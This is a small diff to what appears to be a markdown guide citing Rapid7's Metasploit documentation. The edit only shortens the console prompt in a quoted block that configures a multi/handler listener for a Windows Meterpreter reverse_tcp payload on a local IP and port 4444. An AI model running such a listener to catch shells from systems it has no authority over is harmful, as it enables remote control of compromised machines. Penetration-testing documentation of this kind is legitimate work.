@@ -30,11 +30,11 @@ https://docs.rapid7.com/metasploit/use-meterpreter-locally-without-an-exploit/
 >
 > `msf > use exploit/multi/handler`    
 >
-> `msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp`  
-> `msf exploit(handler) > set LHOST 192.168.0.100`    
-> `msf exploit(handler) > set LPORT 4444`    
-> `msf exploit(handler) > set ExitOnSession false`    
-> `msf exploit(handler) > exploit -j`
+> `msf > set PAYLOAD windows/meterpreter/reverse_tcp`  
+> `msf > set LHOST 192.168.0.100`    
+> `msf > set LPORT 4444`    
+> `msf > set ExitOnSession false`    
+> `msf > exploit -j`
 
 ---
 
